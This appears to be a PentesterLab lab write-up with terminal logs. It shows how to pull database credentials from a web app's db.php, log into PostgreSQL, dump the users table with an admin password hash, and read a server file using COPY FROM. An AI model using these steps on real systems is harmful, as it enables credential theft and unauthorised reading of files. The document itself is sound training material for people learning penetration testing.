**GOAL**: To retreive the key from `/var/lib/postgresql/9.4/key.txt`

## Solution
1. Logging into the instance, and looking at the processes runnin gon the system using `ps -edf` command, we see that there's a `web-app running` 
2. We then visit `/var/www` which is the default location of storing data for the `web-app`
3. We then use `find` command to look for the files in the directory and `/classes/db.php` is the one we are looking for
4. It reveals the username and password required to connect to the database
5. You can then retreive the password from the postgres database as we did in previous exercises
6. But the password we retreive is of no use, instead we need to copy the contents of `/var/lib/postgresql/9.4/key.txt`
7. Once you gain access, you can read files from the file system using:

-  CREATE TABLE demo(t text);
-  COPY demo from '/var/lib/- postgresql/9.4/key.txt';
-  SELECT * FROM demo;

## POC

```linux
pentesterlab@6c785352f398:~$ cd /var/www
pentesterlab@6c785352f398:/var/www$ ls
admin    cat.php  css         header.php  index.php
all.php  classes  footer.php  images      show.php

pentesterlab@6c785352f398:/var/www$ find    
.
./admin
./admin/new.php
./admin/del.php
./admin/login.php
./admin/header.php
./admin/uploads
./admin/uploads/cthulhu.png
./admin/uploads/ruby.jpg
./admin/uploads/hacker.png
./admin/footer.php
./admin/logout.php
./admin/index.php
./show.php
./cat.php
./classes
./classes/phpfix.php
./classes/category.php
./classes/picture.php
./classes/db.php
./classes/user.php
./classes/auth.php
./images
./images/key.png
./header.php
./css
./css/style.css
./css/default.css
./css/base.css
./footer.php
./all.php
./index.php

pentesterlab@6c785352f398:/var/www$ cat classes/db.php 
<?php
    $lnk = pg_connect("host=localhost port=5432 dbname=photoblog user=photo
blog password=**********" );
?>
```

```linux
pentesterlab@6c785352f398:/var/www$ psql photoblog -U photoblog -W
Password for user photoblog: 
psql (9.4.15)
Type "help" for help.

photoblog=# \list
                              List of databases
   Name    |  Owner   | Encoding  | Collate | Ctype |   Access privileges  
  
-----------+----------+-----------+---------+-------+----------------------
--
 photoblog | postgres | SQL_ASCII | C       | C     | =Tc/postgres         
 +
           |          |           |         |       | postgres=CTc/postgres
 +
--
           |          |           |         |       | photoblog=CTc/postgre
s
 postgres  | postgres | SQL_ASCII | C       | C     | 
 template0 | postgres | SQL_ASCII | C       | C     | =c/postgres          
 +
           |          |           |         |       | postgres=CTc/postgres
 template1 | postgres | SQL_ASCII | C       | C     | =c/postgres          
 +
           |          |           |         |       | postgres=CTc/postgres
(4 rows)
photoblog=# \c photoblog
Password for user photoblog: 
You are now connected to database "photoblog" as user "photoblog".
photoblog=# \d
                List of relations
 Schema |       Name        |   Type   |  Owner   
--------+-------------------+----------+----------
 public | categories        | table    | postgres
 public | categories_id_seq | sequence | postgres
 public | pictures          | table    | postgres
 public | pictures_id_seq   | sequence | postgres
 public | users             | table    | postgres
 public | users_id_seq      | sequence | postgres
(6 rows)
photoblog=# select * from users;
 id | login |             password             
----+-------+----------------------------------
  1 | admin | 8efe310f9ab3efeae8d410a8e0166eb2
(1 row)
```

```linux
photoblog=# create TABLE demo(t text);
CREATE TABLE
photoblog=# COPY demo from '/var/lib/postgresql/9.4/key.txt';
COPY 1
photoblog=# select * from demo;
                  t                   
--------------------------------------
 25eb9d43-****-****-****-a7a707380bdb
(1 row)
```